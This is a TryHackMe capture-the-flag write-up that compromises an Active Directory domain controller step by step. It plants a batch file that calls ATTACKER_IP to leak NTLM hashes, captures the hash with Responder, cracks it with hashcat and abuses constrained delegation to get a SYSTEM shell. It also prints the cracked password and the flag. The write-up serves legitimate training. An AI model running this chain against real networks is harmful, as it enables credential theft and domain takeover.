
A CTF challenge from Jr Penetration Tester path on TryHackMe.
Description: *Every request has to go through someone... but what if that someone is you? Route your way through an Active Directory environment, intercept what you shouldn't, and pull the strings from behind the proxy. Nothing gets through without your say.*

I started with `nmap` scan `nmap -sV -sC -T4 -v 10.114.151.229`, the results:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-09 07:15:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ctf.local
| Issuer: commonName=DC01.ctf.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-19T02:27:27
| Not valid after:  2026-11-18T02:27:27
| MD5:   a5ba:7599:e686:083e:1b02:8393:ea32:dc81
|_SHA-1: 059b:417e:faca:4e2e:5ba0:a4c3:b2c2:52e0:dc7e:2074
|_ssl-date: 2026-09-09T07:18:31+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-09T07:17:52+00:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the `nmap` scan, the most interesting things are: 
- Domain Name - `ctf.local`
- Opened port - `smb 445`

I started with listing smb shares: `smbclient -L //10.114.151.229 -N`
Available smb share:
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT-Shared       Disk      IT Department Shared Resources
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

Then I started with `IT-Shared` share, `smbclient //10.114.151.229/IT-Shared -N`, there are three files in the share:
```
IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt         
IT-Portal.html    
```

I downloaded them all, and started looking into them. The `IT-Credentials-Backup.txt` is a interesting file, with credentials in it, but it is also mentioned that they are disabled. So it is dead end. The `IT-Onboarding-Checklist.txt` contains important information, about file scanning service `svc.scanner`, and it tells that it runs every two minutes, and enumerates `IT-Shared` share for new files.

So, I created a file called `hashstealer.bat` with contents:
```
@echo off
dir \\ATTACKER_IP\share > nul 2>&1
```

This file after being processed by `svc.scanner` service, will send an NTLM hash to my responder.
First thing, I set up a responder: `responder -I ens5 -v`, 
next I put `hashstealer.bat` file into `IT-Shared` smb share, with `put hashstealer.bat`.
And I waited for a response. After stealing NTLM hash, I saved it into hash.txt file, in order to crack it with `hashcat`.
The hash I got:
```
svc.scanner::CTF:b7f3ac035e507c52:2B7C2E4936F31FE0155DE57FD5012C87:010100000000000000AC59063440DD016258DDA9825BEEDF000000000200080043005A004F00570001001E00570049004E002D00350045004D004400520046004700410036004100570004003400570049004E002D00350045004D00440052004600470041003600410057002E0043005A004F0057002E004C004F00430041004C000300140043005A004F0057002E004C004F00430041004C000500140043005A004F0057002E004C004F00430041004C000700080000AC59063440DD010600040002000000080030003000000000000000010000000020000002AB233C8C8C1702C30E87350F34381CA42D014C7D0817AEDF2081FB0191BE2C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003100310034002E00370033002E00350036000000000000000000
```

After running `hashcat --identify hash.txt` I know that this is NetNTLMv2 and the mode `5600` need to be used in `hashcat` in `-m` flag in order to crack it.
`hashcat -a 0 -m 5600 hash.txt -w /usr/share/wordlists/rockyou.txt`

The password is: `1summerlove!`

I also added the line `MACHINE_IP  DC01.ctf.local ctf.local DC01` to `/etc/hosts` file.

First I checked `svc.scanner` user's delegation settings:
`findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.114.149.144`

Next I requested a CIFS service ticket while impersonating Administrator:
`getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.114.149.144 ctf.local/svc.scanner:'1summerlove!'`

I exported obtained ticket as an environmental variable to be easier to use:
`export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`

And lastly, I gained shell with `SYSTEM` privileges, using the cached Kerberos ticket with smb execution:
`smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local`

The flag is located in the `C:\Users\Administrator\Desktop\flag.txt`

`type C:\Users\Administrator\Desktop\flag.txt`
**THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}**